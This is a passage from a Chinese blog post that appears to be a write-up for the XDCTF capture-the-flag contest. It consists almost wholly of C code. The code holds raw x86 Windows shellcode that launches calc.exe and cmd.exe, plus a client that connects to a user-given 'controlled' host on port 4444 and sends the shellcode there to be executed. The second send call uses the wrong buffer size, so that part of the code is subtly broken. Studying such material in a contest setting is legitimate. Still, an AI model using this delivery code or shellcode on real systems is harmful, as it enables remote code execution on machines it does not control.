<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xf0</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x57</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x10</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x42</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x78</span><span  style="color: #660099; font-weight: bold;">\x85</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x4a</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x48</span><span  style="color: #660099; font-weight: bold;">\x18</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x20</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\xe3</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x49</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x34</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd6</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\xac</span><span  style="color: #660099; font-weight: bold;">\xc1</span><span  style="color: #660099; font-weight: bold;">\xcf</span><span  style="color: #660099; font-weight: bold;">\x0d</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xc7</span><span  style="color: #660099; font-weight: bold;">\x38</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xf4</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\x7d</span><span  style="color: #660099; font-weight: bold;">\xf8</span><span  style="color: #660099; font-weight: bold;">\x3b</span><span  style="color: #660099; font-weight: bold;">\x7d</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xe2</span><span  style="color: #660099; font-weight: bold;">\x58</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\x66</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x0c</span><span  style="color: #660099; font-weight: bold;">\x4b</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x1c</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\x8b</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x04</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5b</span><span  style="color: #660099; font-weight: bold;">\x5b</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x59</span><span  style="color: #660099; font-weight: bold;">\x5a</span><span  style="color: #660099; font-weight: bold;">\x51</span><span  style="color: #660099; font-weight: bold;">\xff</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x5f</span><span  style="color: #660099; font-weight: bold;">\x5a</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x12</span><span  style="color: #660099; font-weight: bold;">\xeb</span><span  style="color: #660099; font-weight: bold;">\x86</span><span  style="color: #660099; font-weight: bold;">\x5d</span><span  style="color: #660099; font-weight: bold;">\x6a</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x8d</span><span  style="color: #660099; font-weight: bold;">\x85</span><span  style="color: #660099; font-weight: bold;">\xb9</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x6f</span><span  style="color: #660099; font-weight: bold;">\x87</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\xbb</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x1d</span><span  style="color: #660099; font-weight: bold;">\x2a</span><span  style="color: #660099; font-weight: bold;">\x0a</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xa6</span><span  style="color: #660099; font-weight: bold;">\x95</span><span  style="color: #660099; font-weight: bold;">\xbd</span><span  style="color: #660099; font-weight: bold;">\x9d</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x06</span><span  style="color: #660099; font-weight: bold;">\x7c</span><span  style="color: #660099; font-weight: bold;">\x0a</span><span  style="color: #660099; font-weight: bold;">\x80</span><span  style="color: #660099; font-weight: bold;">\xfb</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x75</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x05</span><span  style="color: #660099; font-weight: bold;">\xbb</span><span  style="color: #660099; font-weight: bold;">\x47</span><span  style="color: #660099; font-weight: bold;">\x13</span><span  style="color: #660099; font-weight: bold;">\x72</span><span  style="color: #660099; font-weight: bold;">\x6f</span><span  style="color: #660099; font-weight: bold;">\x6a</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\x63</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x6c</span><span  style="color: #660099; font-weight: bold;">\x63</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x2e</span><span  style="color: #660099; font-weight: bold;">\x65</span><span  style="color: #660099; font-weight: bold;">\x78</span><span  style="color: #660099; font-weight: bold;">\x65</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span><span  style="color: #008080;">;</span>
&nbsp;
<span  style="color: #0000ff;">unsigned</span> <span  style="color: #0000ff;">char</span> shellcode_cmd<span  style="color: #008000;">[</span><span  style="color: #008000;">]</span> <span  style="color: #000080;">=</span> 
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xfc</span><span  style="color: #660099; font-weight: bold;">\xe8</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x60</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\xe5</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xd2</span><span  style="color: #660099; font-weight: bold;">\x64</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x30</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x0c</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x14</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x72</span><span  style="color: #660099; font-weight: bold;">\x28</span><span  style="color: #660099; font-weight: bold;">\x0f</span><span  style="color: #660099; font-weight: bold;">\xb7</span><span  style="color: #660099; font-weight: bold;">\x4a</span><span  style="color: #660099; font-weight: bold;">\x26</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xff</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\xac</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x7c</span><span  style="color: #660099; font-weight: bold;">\x02</span><span  style="color: #660099; font-weight: bold;">\x2c</span><span  style="color: #660099; font-weight: bold;">\x20</span><span  style="color: #660099; font-weight: bold;">\xc1</span><span  style="color: #660099; font-weight: bold;">\xcf</span><span  style="color: #660099; font-weight: bold;">\x0d</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xc7</span><span  style="color: #660099; font-weight: bold;">\xe2</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xf0</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x57</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x10</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x42</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x78</span><span  style="color: #660099; font-weight: bold;">\x85</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x4a</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x48</span><span  style="color: #660099; font-weight: bold;">\x18</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x20</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\xe3</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x49</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x34</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd6</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\xac</span><span  style="color: #660099; font-weight: bold;">\xc1</span><span  style="color: #660099; font-weight: bold;">\xcf</span><span  style="color: #660099; font-weight: bold;">\x0d</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xc7</span><span  style="color: #660099; font-weight: bold;">\x38</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xf4</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\x7d</span><span  style="color: #660099; font-weight: bold;">\xf8</span><span  style="color: #660099; font-weight: bold;">\x3b</span><span  style="color: #660099; font-weight: bold;">\x7d</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xe2</span><span  style="color: #660099; font-weight: bold;">\x58</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\x66</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x0c</span><span  style="color: #660099; font-weight: bold;">\x4b</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x1c</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd3</span><span  style="color: #660099; font-weight: bold;">\x8b</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x04</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xd0</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5b</span><span  style="color: #660099; font-weight: bold;">\x5b</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x59</span><span  style="color: #660099; font-weight: bold;">\x5a</span><span  style="color: #660099; font-weight: bold;">\x51</span><span  style="color: #660099; font-weight: bold;">\xff</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x5f</span><span  style="color: #660099; font-weight: bold;">\x5a</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x12</span><span  style="color: #660099; font-weight: bold;">\xeb</span><span  style="color: #660099; font-weight: bold;">\x86</span><span  style="color: #660099; font-weight: bold;">\x5d</span><span  style="color: #660099; font-weight: bold;">\x6a</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x8d</span><span  style="color: #660099; font-weight: bold;">\x85</span><span  style="color: #660099; font-weight: bold;">\xb9</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x6f</span><span  style="color: #660099; font-weight: bold;">\x87</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\xbb</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x1d</span><span  style="color: #660099; font-weight: bold;">\x2a</span><span  style="color: #660099; font-weight: bold;">\x0a</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xa6</span><span  style="color: #660099; font-weight: bold;">\x95</span><span  style="color: #660099; font-weight: bold;">\xbd</span><span  style="color: #660099; font-weight: bold;">\x9d</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x06</span><span  style="color: #660099; font-weight: bold;">\x7c</span><span  style="color: #660099; font-weight: bold;">\x0a</span><span  style="color: #660099; font-weight: bold;">\x80</span><span  style="color: #660099; font-weight: bold;">\xfb</span><span  style="color: #660099; font-weight: bold;">\xe0</span><span  style="color: #660099; font-weight: bold;">\x75</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x05</span><span  style="color: #660099; font-weight: bold;">\xbb</span><span  style="color: #660099; font-weight: bold;">\x47</span><span  style="color: #660099; font-weight: bold;">\x13</span><span  style="color: #660099; font-weight: bold;">\x72</span><span  style="color: #660099; font-weight: bold;">\x6f</span><span  style="color: #660099; font-weight: bold;">\x6a</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\xff</span><span  style="color: #660099; font-weight: bold;">\xd5</span><span  style="color: #660099; font-weight: bold;">\x63</span><span  style="color: #660099; font-weight: bold;">\x6d</span><span  style="color: #660099; font-weight: bold;">\x64</span><span  style="color: #660099; font-weight: bold;">\x2e</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x65</span><span  style="color: #660099; font-weight: bold;">\x78</span><span  style="color: #660099; font-weight: bold;">\x65</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span><span  style="color: #008080;">;</span>
&nbsp;
<span  style="color: #0000ff;">int</span> main<span  style="color: #008000;">(</span><span  style="color: #0000ff;">int</span> argc, <span  style="color: #0000ff;">char</span> <span  style="color: #000040;">**</span>argv<span  style="color: #008000;">)</span>
<span  style="color: #008000;">{</span>
    WSADATA wsad<span  style="color: #008080;">;</span>
    SOCKET sHost<span  style="color: #008080;">;</span>
    SOCKADDR_IN servAddr<span  style="color: #008080;">;</span>
    <span  style="color: #0000ff;">int</span> retVal<span  style="color: #008080;">;</span>
&nbsp;
    <span  style="color: #0000ff;">if</span> <span  style="color: #008000;">(</span>WSAStartup<span  style="color: #008000;">(</span>MAKEWORD<span  style="color: #008000;">(</span><span  style="color: #0000dd;">2</span>, <span  style="color: #0000dd;">2</span><span  style="color: #008000;">)</span>, <span  style="color: #000040;">&amp;</span>wsad<span  style="color: #008000;">)</span> <span  style="color: #000040;">!</span><span  style="color: #000080;">=</span> <span  style="color: #0000dd;">0</span><span  style="color: #008000;">)</span>
    <span  style="color: #008000;">{</span>
        <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"初始化套接字失败!<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        <span  style="color: #0000ff;">return</span> <span  style="color: #000040;">-</span><span  style="color: #0000dd;">1</span><span  style="color: #008080;">;</span>
    <span  style="color: #008000;">}</span>
&nbsp;
    sHost <span  style="color: #000080;">=</span> socket<span  style="color: #008000;">(</span>AF_INET, SOCK_STREAM, IPPROTO_TCP<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>    
    <span  style="color: #0000ff;">if</span><span  style="color: #008000;">(</span>INVALID_SOCKET <span  style="color: #000080;">==</span> sHost<span  style="color: #008000;">)</span>
    <span  style="color: #008000;">{</span>
        <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"创建套接字失败!<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        WSACleanup<span  style="color: #008000;">(</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        <span  style="color: #0000ff;">return</span>  <span  style="color: #000040;">-</span><span  style="color: #0000dd;">1</span><span  style="color: #008080;">;</span>
    <span  style="color: #008000;">}</span>
&nbsp;
    <span  style="color: #0000ff;">char</span> szip<span  style="color: #008000;">[</span><span  style="color: #0000dd;">64</span><span  style="color: #008000;">]</span> <span  style="color: #000080;">=</span> <span  style="color: #008000;">{</span><span  style="color: #0000dd;">0</span><span  style="color: #008000;">}</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"请输入被控端IP地址："</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000dd;">scanf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"%s"</span>, szip<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    servAddr.<span  style="color: #007788;">sin_family</span> <span  style="color: #000080;">=</span> AF_INET<span  style="color: #008080;">;</span>
    servAddr.<span  style="color: #007788;">sin_addr</span>.<span  style="color: #007788;">s_addr</span> <span  style="color: #000080;">=</span> inet_addr<span  style="color: #008000;">(</span>szip<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    servAddr.<span  style="color: #007788;">sin_port</span> <span  style="color: #000080;">=</span> htons<span  style="color: #008000;">(</span><span  style="color: #0000dd;">4444</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000ff;">int</span> nServAddlen <span  style="color: #000080;">=</span> <span  style="color: #0000dd;">sizeof</span><span  style="color: #008000;">(</span>servAddr<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
&nbsp;
    retVal <span  style="color: #000080;">=</span> connect<span  style="color: #008000;">(</span>sHost, <span  style="color: #008000;">(</span>LPSOCKADDR<span  style="color: #008000;">)</span><span  style="color: #000040;">&amp;</span>servAddr, <span  style="color: #0000dd;">sizeof</span><span  style="color: #008000;">(</span>servAddr<span  style="color: #008000;">)</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>    
    <span  style="color: #0000ff;">if</span><span  style="color: #008000;">(</span>SOCKET_ERROR <span  style="color: #000080;">==</span> retVal<span  style="color: #008000;">)</span>
    <span  style="color: #008000;">{</span>
        <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"连接服务器失败!<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>    
        closesocket<span  style="color: #008000;">(</span>sHost<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        WSACleanup<span  style="color: #008000;">(</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        <span  style="color: #0000ff;">return</span> <span  style="color: #000040;">-</span><span  style="color: #0000dd;">1</span><span  style="color: #008080;">;</span>
    <span  style="color: #008000;">}</span>
&nbsp;
    <span  style="color: #666666;">//向服务器发送数据</span>
    <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"<span  style="color: #000099; font-weight: bold;">\n</span>准备发送弹出计算器的Shellcode<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    retVal <span  style="color: #000080;">=</span> send<span  style="color: #008000;">(</span>sHost, <span  style="color: #008000;">(</span><span  style="color: #0000ff;">char</span> <span  style="color: #000040;">*</span><span  style="color: #008000;">)</span>shellcode_calc, <span  style="color: #0000dd;">sizeof</span><span  style="color: #008000;">(</span>shellcode_calc<span  style="color: #008000;">)</span>, <span  style="color: #0000dd;">0</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000ff;">if</span> <span  style="color: #008000;">(</span>SOCKET_ERROR <span  style="color: #000080;">==</span> retVal<span  style="color: #008000;">)</span>
    <span  style="color: #008000;">{</span>
        <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"发送弹出计算器的Shellcode失败!<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        closesocket<span  style="color: #008000;">(</span>sHost<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        WSACleanup<span  style="color: #008000;">(</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        <span  style="color: #0000ff;">return</span> <span  style="color: #000040;">-</span><span  style="color: #0000dd;">1</span><span  style="color: #008080;">;</span>
    <span  style="color: #008000;">}</span>
    <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"按Enter发送下一段Shellcode<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000dd;">system</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"pause"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
&nbsp;
    <span  style="color: #666666;">//向服务器发送数据</span>
    <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"<span  style="color: #000099; font-weight: bold;">\n</span>准备发送弹出CMD的Shellcode<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    retVal <span  style="color: #000080;">=</span> send<span  style="color: #008000;">(</span>sHost, <span  style="color: #008000;">(</span><span  style="color: #0000ff;">char</span> <span  style="color: #000040;">*</span><span  style="color: #008000;">)</span>shellcode_cmd, <span  style="color: #0000dd;">sizeof</span><span  style="color: #008000;">(</span>shellcode_calc<span  style="color: #008000;">)</span>, <span  style="color: #0000dd;">0</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000ff;">if</span> <span  style="color: #008000;">(</span>SOCKET_ERROR <span  style="color: #000080;">==</span> retVal<span  style="color: #008000;">)</span>
    <span  style="color: #008000;">{</span>
        <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"发送弹出计算器的Shellcode失败!<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        closesocket<span  style="color: #008000;">(</span>sHost<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        WSACleanup<span  style="color: #008000;">(</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
        <span  style="color: #0000ff;">return</span> <span  style="color: #000040;">-</span><span  style="color: #0000dd;">1</span><span  style="color: #008080;">;</span>
    <span  style="color: #008000;">}</span>
&nbsp;
    <span  style="color: #0000dd;">printf</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"测试完毕，准备退出！<span  style="color: #000099; font-weight: bold;">\n</span>"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    <span  style="color: #0000dd;">system</span><span  style="color: #008000;">(</span><span  style="color: #FF0000;">"pause"</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
&nbsp;
    closesocket<span  style="color: #008000;">(</span>sHost<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
    WSACleanup<span  style="color: #008000;">(</span><span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
&nbsp;
    <span  style="color: #0000ff;">return</span> <span  style="color: #0000dd;">0</span><span  style="color: #008080;">;</span>
<span  style="color: #008000;">}</span></pre></td></tr></tbody></table></div>

<p>最终效果截图：<br>
</p><div  id="attachment_2846"  class="wp-caption aligncenter"  style="width: 687px"><a  href="http://www.programlife.net/wp-content/uploads/2013/10/XDCTF-ShellCode.jpg"><img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/XDCTF-ShellCode.jpg"  alt="XDCTF ShellCode"  width="677"  height="442"  class="size-full wp-image-2846"></a><p  class="wp-caption-text">ShellCode控制端与被控端测试</p></div><br>
<hr>
<p>本博客很少转载他人文章，如未特别标明，均为原创，转载请注明出处:<br>
本文出自<a  href="http://www.programlife.net/">程序人生</a> &gt;&gt; <a  href="http://www.programlife.net/shellcode-diy.html">[XDCTF]Shellcode DIY</a><br>
作者：<strong>代码疯子</strong></p><center><script  type="text/javascript"><!--
google_ad_client = "ca-pub-6536631028356092";
/* Net正文底部 */
google_ad_slot = "3524023097";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script><script  type="text/javascript"  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
